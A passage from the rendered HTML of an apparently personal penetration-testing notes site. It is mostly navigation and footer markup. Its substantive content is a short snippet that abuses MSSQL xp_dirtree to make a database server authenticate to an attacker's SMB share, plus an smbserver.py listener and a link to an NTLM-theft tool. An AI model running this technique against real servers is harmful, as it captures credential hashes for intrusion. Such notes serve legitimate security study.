+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">EXEC master.sys.xp_dirtree <span class="s1">&#39;\\10.8.3.12\myshare&#39;</span>,1,1
+</span></span><span class="line"><span class="cl">smbserver.py -smb2support share .</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Tool :
+https://github.com/Greenwolf/ntlm_theft</li>
+</ul>
+
+			<div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between">
+				</div>
+			<div class="page-nav d-flex flex-column flex-sm-row">
+	
+	<div class="card w-100">
+			<div class="card-body d-flex">
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M5 12l6 6"></path>
+						<path d="M5 12l6 -6"></path>
+				 	</svg>
+				</div>
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Prev</div>
+					<a href="/notes/web/graphsql/" class="stretched-link text-reset text-decoration-none">Graphsql</a>
+				</div>
+			</div>
+		</div>
+	<div class="m-2"></div>
+	<div class="card text-end w-100">
+			<div class="card-body d-flex justify-content-end">
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Next</div>
+					<a href="/notes/lab/vulnlab/heron/" class="stretched-link text-reset text-decoration-none">Heron</a>
+				</div>
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M13 18l6 -6"></path>
+						<path d="M13 6l6 6"></path>
+					</svg>
+				</div>
+			</div>
+		</div>
+	</div>
+
+			
+		</main>
+		
+	</div>
+
+      
+      </div>
+    </div>
+    
+    
+    <footer class="footer text-muted">
+  <div class="container-lg">
+    <div class="row">
+      <div class="col-lg-8 text-center text-lg-start">
+        <ul class="list-inline">
+          <li class="list-inline-item"><a class="text-muted" href="/privacy/">Privacy Policy</a></li>
+        </ul>
+      </div>
+      <div class="col-lg-8 text-center text-lg-end">
+        <ul class="list-inline">
+          <li class="list-inline-item">Brought to you by <a class="text-muted" href="https://thulite.io/">Thulite</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</footer>
+
+    
+
+<script async
+  src="/js/app.249127ac97fccea7237e5990340629c63da5a555a7c4a120cf11a5113ea5e96e.js"
+  integrity="sha256-JJEnrJf8zqcjflmQNAYpxj2lpVWnxKEgzxGlET6l6W4=">
+</script>
+
+
+
+
+
+<script async
+  src="/js/flexsearch.be33aab3067e96554f261851c25a593228b91154cd28ff5c7f8d52b2e7f306d2.js"
+  integrity="sha256-vjOqswZ&#43;llVPJhhRwlpZMii5EVTNKP9cf41SsufzBtI=">
+</script>
+<script async
+  src="/js/search-modal.97d606e77f08deeb37876860d99c8f6813ef29263e73b6435c252de6be98d55e.js"
+  integrity="sha256-l9YG538I3us3h2hg2ZyPaBPvKSY&#43;c7ZDXCUt5r6Y1V4=">
+</script>
+
+    
+  </body>
+</html>
